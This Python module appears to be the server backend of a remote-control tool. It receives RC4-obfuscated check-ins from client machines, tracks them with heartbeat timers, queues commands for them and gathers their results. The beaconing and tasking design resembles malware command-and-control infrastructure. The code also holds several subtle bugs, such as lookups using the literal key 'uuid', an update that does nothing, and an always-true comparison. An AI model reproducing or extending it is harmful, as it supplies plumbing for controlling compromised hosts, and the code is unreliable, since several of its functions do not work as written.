# coding:utf-8
import queue
import asyncio
from app.utils import *
from threading import Thread
from time import sleep
events = queue.Queue()
Conn = {}


def online_list():

    l = []
    for k in Conn:
        l.append({
            "uuid": k,
            "info": Conn[k]["info"]
        })
    return dumps({
        "action": "just for you",
        "data": l
    })


def get_action():
    return events.get()


def do_action(uuid, do_something):
    if uuid not in Conn:
        return
    Conn["uuid"]["do"].append(do_something)


def online(uuid):
    print("[!][BackEnd]Online:{}".format(uuid))
    Thread(target=timer, args=(uuid,)).start()
    events.put(
        {
            "action": "online",
            "data": {
                "uuid": uuid,
                "info": Conn[uuid]["info"]
            }
        }
    )


def offline(uuid):
    if uuid in Conn:

        events.put(
            {
                "action": "offline",
                "data": {
                    "uuid": uuid,
                    "info": Conn[uuid]["info"]["ip"]
                }
            }
        )
        Conn.pop(uuid)


def timer(uuid):
    while True:
        sleep(Conn[uuid]["next_second"])
        if int(time()) > Conn[uuid]["time"] + Conn[uuid]["next_second"] + 5:
            print("[!][BackEnd]{} TimeOut.".format(uuid))
            offline(uuid)
            break


def handle(packet):
    raw = rc4_decode(packet)
    data = loads(raw)
    if "uuid" not in data or "info" not in data:
        return "", 404
    else:
        if data["uuid"] not in Conn:
            Conn[data["uuid"]] = {
                "info": data["info"],
                "time": int(time()),
                "next_second": 30.,
                "do": []
            }
            online(data["uuid"])

        if "next_second" in data:
            # 更新表中的时间为下次检测日期
            Conn[data["uuid"]]["time"]: int(time())
            Conn[data["uuid"]]["next_second"] = data["next_second"]
    if "result" in data and type(data["result"]) is list:
        if data["result"] is not []:
            for i in data["result"]:
                events.put(
                    {
                        "action": "result",
                        "data": {
                            "uuid": data["uuid"],
                            "action": i["action"],
                            "data": i["data"]
                        }
                    }
                )

        else:
            result = Conn["do"]
            Conn["do"] = []
            return result
    return dumps(
        {
            "do": "",
            "data": ""
        }
    )